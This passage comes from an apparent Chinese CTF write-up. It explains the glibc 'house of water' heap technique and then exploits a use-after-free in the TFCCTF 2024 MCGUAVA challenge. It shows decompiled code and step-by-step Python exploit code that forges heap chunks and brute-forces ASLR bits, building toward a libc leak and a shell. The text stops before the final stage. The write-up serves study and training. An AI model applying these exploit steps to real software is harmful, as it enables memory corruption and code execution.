title="我的图图呢"><p>可以看到 fake chunk 的 fd 和 bk 已经留下我们前面 2 个释放的 fake chunk 的 data 区域地址，同时这个 2 地址<br>也分别是 unsorted_end 和 unsorted_start 这 2 个堆块的地址，这是因为 0x555555559090 这个地址为 tcache_perthread_struct 结构体 entries 链表的起始地址，存放的是最后进入 0x20 大小的 tcache 链表的堆块的地址，而我们最后释放的 2 个 fake chunk 大小分别为 0x20 和 0x30。<br>我们将断点下到第 63 行，期间进行的操作为：依次释放 unsorted_end、unsorted_middle、unsorted_start。bin 的结构如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png" class="" title="我的图图呢"><p>接下来我们的操作是要让我们一开始在 tcache_perthread_struct 中伪造的堆块链入 unsorted bin，这里的操作是将 unsorted_middle 给替换为 fake chunk。回到我们 fake chunk 的那张图片，我们可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，所以接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk 即可完成 unsorted bin 上堆块替换操作<br>将断点下在第 67 行，期间的操作就是进行上述的指针替换操作，最后的 bin 结构如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png" class="" title="我的图图呢"><p>可以看到已经成功将 unsorted_middle 给替换为 fake chunk。<br>接下来就是要让 fake unsorted chunk 的 fd 指针和 bk 指针出现 libc 的地址，当我们申请一个 chunk 的size 小于 0x10000 且无对应 size 的 chunk 在tcache 和其他 bin 中时，会先对 unsroted bin 进行遍历，然后 unsorted_end 和 unsorted_start 送入 smallbin 中，将 fake chunk 送入 largebin 中，此时 fake chunk 的 fd 和 bk 指针指向 libc 的相关地址，此时再在 fake unsorted chunk 中切割出合适大小的堆块进行分配。how2heap 的代码中选择申请的堆块大小为 0x290，其实申请的大小满足我上面所说的条件即可。<br>将断点下到 70 行，此时已经完成了堆块的申请，查看 tcache_perthread_struct 结构体和 bin 的结构：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png" class="" title="我的图图呢"><p>已经给踩上 libc 上的地址⬆️</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png" class="" title="我的图图呢"><p>此时我们可以进行 libc 上内存的分配，这也是 house of water 的所有内容，后续的攻击就看每个人的需求了。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>可以看到 house of water 能够在没有内存泄露的情况下在 tcache 链上留下 libc 的相关地址。在修改 unsorted_start 和 unsroted_end 的指针使 fake unsorted chunk 链入unosorted chunk 的这步中我们需要进行一步小爆破，因为我们每次修改不能只覆盖地址的低3位，而是低4位，在开启了 alsr 的环境下从第 4 位开始的地址都是随机的。<br>我认为 house of water 攻击的关键是伪造并释放那 2 个大小分别为 0x20 和 0x30 的堆块，想了想这个伪造在 pwn 题中并不简单。<br>希望读者能够自己调试一遍 how2heap 里面的代码，相信你们一定会有新的收获。</p><h2 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h2><p>这道题目需要用到 house of water，当时好像有 7 解了，可是我还没做出来，太菜了😭😭😭</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png" class="" title="我的图图呢"><p>当时的想法是让同一个 chunk 同时进入 unsortedbin 和 smallbin 以此来留下 libc 的地址，可是搞了半天什么都没搞出来，不知道有没有师傅是用这种方法做出来的🤔<br>题目可以从 r3kapig 战队的比赛题库中找到：<a href="https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee">TFC CTF 2024(Jeopardy) (notion.site)</a><br>这题附件里给的 dockerfile 里写的远程环境为 ubuntu:24.10，我寻思着这不也才 8 月嘛，怎么都有 10 了🤔<br>这里我做了个小偷懒，libc 我用了本地的 2.35，不过大差不差，最终思路还是一样的，也就一个偏移不同而已<br>由于题目代码量比较少，这里就直接贴上来</p><h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>main：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    guava_gius[i] = <span class="number">0LL</span>;</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      guava();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      gius();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>guava：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">guava</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cnt_guavas &gt; <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how many guavas: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1791</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavset: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v2 - <span class="number">2</span> &lt;= v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavas: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4[v3], v2 - v3);</span><br><span class="line">  v0 = cnt_guavas++;</span><br><span class="line">  guava_gius[v0] = v4;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gius：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gius</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guava no: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)guava_gius[v1]);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这是一个很典型的菜单程序，实现了堆块的申请和释放功能，没有编辑和和打印功能。漏洞十分的明显，就是 gius 在释放堆块后并没有将相应的指针置 0，这里存在 UAF 漏洞。程序最多可以申请 0x100 个堆块，每个堆块最大为 0x1791，这不摆明着让我们使用 house of water 进行攻击嘛？😇<br>这里先贴上我的交互脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>现在我们的整理思路是利用 house of water 实现 stdout 上的内存分配，然后通过 stdout 泄露出 libc 的地址，最后通过伪造 io file 来 getshell。<br>既然上面说到 house of water 的关键是伪造 unsorted_start 和 unsroted_end 上方的2个小堆块，这里就先进行这一步，已经 unsorted_start 为例</p><h4 id="获取堆块索引"><a href="#获取堆块索引" class="headerlink" title="获取堆块索引"></a>获取堆块索引</h4><p>因为我们的小 fake chunk 和 unsorted_start 最终都是要给 free 掉的，所以我们要先获得他的索引，这里我使用的是堆块切割法，通过让一个巨大的堆块进入 unsorted bin，然后按照一定的大小申请 2 个堆块出来获取索引，然后再将申请出来的堆块释放掉，使其再次和合并进入 unsorted bin，相关代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></figure><p>这里我一共申请了 4 个大堆块，其中第 4 个堆块是用于防止 unsorted bin 与 top chunk 进行合并。可能有人会问为什么我要申请这么大的堆块来防止合并，其实我是为了减少对 tcache 的影响，因为 house of water 后的攻击将会在 tcache_perthread_struct 中进行，所以我尽可能的让更少的 chunk 进入 tcache。这里进行了 fake 0x30 和 unsorted_start 2 个堆块索引的获取，并将 fake 0x30 释放掉进入 tcache<br>这里我们将上面代码进行修改如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line">free(<span class="number">15</span>) <span class="comment"># free unsorted_start</span></span><br></pre></td></tr></table></figure><p>这里释放了我们 unsorted_start，此时 bin 的结构如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png" class="" title="我的图图呢"><p>可以看到 0x30 的 tcache 和 unsorted bin 指向的是同一块区域，说明我们伪造成功<br>对于 unsorted_end 上方 fake chunk 的伪造原理相同，只不过这里的 fake chunk 大小为 0x20，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">free(<span class="number">21</span>)</span><br><span class="line">free(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br></pre></td></tr></table></figure><p>接下来需要获取 unsorted_middle 这个堆块的索引，因为这个堆块不需要在上方伪造 fake chunk，所以索引比较容易获得，直接申请即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br></pre></td></tr></table></figure><p>第二个堆块同样是为了防止合并<br>后面依然进行简单的操作，在 tcache_perthread_struct 上进行 fake unsorted chunk 的伪造，这部也比较简单，已经成为模板化的东西了，申请 2 个 size 分别为 0x3f0 和 0x3e0 的堆块然后直接释放掉即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">free(<span class="number">29</span>)</span><br><span class="line">free(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png" class="" title="我的图图呢"><h4 id="获取能够修改-unsorted-start-和-unsorted-end-的堆块"><a href="#获取能够修改-unsorted-start-和-unsorted-end-的堆块" class="headerlink" title="获取能够修改 unsorted_start 和 unsorted_end 的堆块"></a>获取能够修改 unsorted_start 和 unsorted_end 的堆块</h4><p>这一步主要是因为程序没有编辑功能，当我们将 unsorted_end、unsorted_middle、unsorted_start 释放进 unsorted bin 时我们就无法修改 unsorted_start 和 unsorted_end 的指针。<br>这里我还是使用堆块切割是思想，相关代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">free(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end</span></span><br><span class="line">free(<span class="number">24</span>)</span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">free(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br></pre></td></tr></table></figure><p>这里用于修改 unsorted_start 和 unsorted_end 的堆块我选择的大小为 0x340 和 0x350，因为这个 2 个大小的堆块个释放后是直接进入 tcache，对后面 unsorted bin 中存储的 unsorted_end、unsorted_middle、unsorted_start 影响比较小<br>但由于这个操作改变了原来 unsorted_end、unsorted_start 的 size位</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png" class="" title="我的图图呢"><p>所以我们需要用我们刚获取的 tcache 堆块来对 unsorted_end、unsorted_start 的 size 位进行恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">free(<span class="number">39</span>) </span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">free(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><h4 id="伪造-fake-unsorted-chunk-的prev-size-和-size"><a href="#伪造-fake-unsorted-chunk-的prev-size-和-size" class="headerlink" title="伪造 fake unsorted chunk 的prev_size 和 size"></a>伪造 fake unsorted chunk 的prev_size 和 size</h4><p>因为我们的 fake unsorted chunk 最终进入到 unsorted bin 中，unsorted bin 会检测这个堆块的合法性，会检测 fake unosrted chunk 的 next chunk 的prev_size 和 size，伪造代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br></pre></td></tr></table></figure><p>注意这里 next chunk 的 issue 位要为 0，因为 unsorted bin 上的堆块都是没有给使用的<br>接下来就是愉快的一条龙服务，依次释放 unsorted_end、unsorted_middle、unsorted_start 进入 unsorted bin，然后分别修改 unsorted_start 和 unsorted_end 的 fd 和 bk 指针将 fake unsorted chunk 链入 unsorted bin 中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">free(<span class="number">78</span>)</span><br><span class="line">free(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># 依次释放 unsorted_end、unsorted_middle、unsorted_start</span></span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">free(<span class="number">27</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk</span></span><br><span class="line">add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">free(<span class="number">80</span>)</span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">free(<span class="number">81</span>)</span><br></pre></td></tr></table></figure><p>这里我提前申请了 2 个 chunk，大小分别为 0x240 和 0x250，这 2 个堆块在后续的攻击中会用到。在修改 fd 和 bk指针中我们需要爆破地址的第 4 位，概率为 1&#x2F;16，我这里选择爆破的是 heapbase 的第 4 位为 0，成功后的效果如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png" class="" title="我的图图呢"><p>可以看到 fake unsorted chunk 已经进入到 unsorted bin 中，现在我们来梳理一下目前的状况：<br>目前 unsorted bin 中有 3 个堆块，两侧的 unsorted_end、unsorted_start 大小为 0x510，中间的 fake unsorted chunk 的大小为 0x10001，两侧的堆块十分的碍事，所以我们将其申请出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时 fake unsorted chunk 